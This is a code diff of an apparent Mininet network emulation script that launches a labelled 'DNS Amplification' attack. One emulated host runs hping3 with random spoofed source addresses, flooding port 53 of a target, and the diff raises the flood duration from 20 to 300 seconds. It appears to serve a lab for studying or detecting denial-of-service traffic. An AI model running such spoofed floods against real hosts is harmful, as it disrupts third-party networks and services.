@@ -48,9 +48,7 @@ def startNetwork():
     print("--------------------------------------------------------------------------------")
     print("Performing DNS Amplification")  
     print("--------------------------------------------------------------------------------")   
-    src.cmd("timeout 20s hping3 --rand-source -p 53 --flood --data 100 {}".format(dst,dst))
-    sleep(100)  
-    print("--------------------------------------------------------------------------------")
+    src.cmd("timeout 300s hping3 --rand-source -p 53 --flood --data 100 {}".format(dst,dst)) 
 
     # CLI(net)
     net.stop()
